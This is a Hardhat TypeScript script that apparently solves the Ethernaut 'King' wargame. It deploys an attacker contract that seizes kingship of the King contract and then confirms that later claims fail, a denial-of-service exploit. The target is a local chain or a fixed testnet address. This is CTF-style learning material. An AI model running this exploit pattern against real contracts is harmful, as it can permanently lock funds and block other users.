import { ethers, network } from "hardhat";
import { King, KingAttacker } from "../typechain-types";

async function main() {
  let king: King;
  const [_attacker, deployer] = await ethers.getSigners();

  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  const kingAttacker: KingAttacker = await ethers.getContract("KingAttacker");

  if (isLocalTest) {
    king = await ethers.getContract("King");
  } else {
    king = await ethers.getContractAt(
      "King",
      "0x3a7a3b1a45CC4e58658f114F6db12D2C0481a0f1"
    );
  }

  async function check() {
    const kingAddress = await king._king();

    console.log(kingAddress);
    console.log(kingAttacker.address);
  }

  await check();

  console.log("------------------------------------------------------------");

  const tx = await kingAttacker.claim({
    value: ethers.utils.parseEther("0.002"),
  });

  await tx.wait(isLocalTest ? 1 : 5);

  await check();

  // should fail
  if (isLocalTest) {
    try {
      const txReclaim = await deployer.sendTransaction({
        to: king.address,
        value: ethers.utils.parseEther("0.000001"),
        gasLimit: "8000000",
      });
      txReclaim.wait(isLocalTest ? 1 : 5);
    } catch (error) {
      console.log("fail successfully");
    }

    await check();
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
